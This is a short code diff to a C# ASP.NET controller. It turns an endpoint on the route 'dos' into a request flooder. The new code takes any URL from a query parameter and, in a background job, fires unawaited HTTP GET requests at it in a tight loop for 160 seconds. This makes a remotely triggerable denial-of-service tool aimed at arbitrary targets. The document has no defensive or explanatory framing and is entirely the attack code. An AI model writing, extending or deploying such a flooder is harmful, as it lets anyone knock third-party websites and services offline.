@@ -155,23 +155,25 @@ namespace MyWebApp.Controllers
 
         [Route("dos")]
         [HttpGet]
-        public IActionResult Get()
+        public IActionResult Start([FromQuery] string link)
         {
             _queue.QueueBackgroundWorkItem(async token =>
             {
                 using (var scope = _serviceScopeFactory.CreateScope())
                 {
+
                     var scopedServices = scope.ServiceProvider;
-                    int j = 1000;
-
-                    for (int i = 0; i < j; i++)
+                    HttpClient client = new HttpClient();
+                    Stopwatch timer = new Stopwatch();
+                    timer.Start();
+                    while (timer.Elapsed.TotalSeconds < 160)
                     {
-                        Console.WriteLine(i);
+                        var response = client.GetAsync(link);
+                        Console.WriteLine(response.Status);
                     }
-
+                    //await Task.Delay(TimeSpan.FromSeconds(5), token);
 
                 }
-                await Task.Delay(TimeSpan.FromSeconds(0), token);
             });
             return Ok("In progress..");
         }
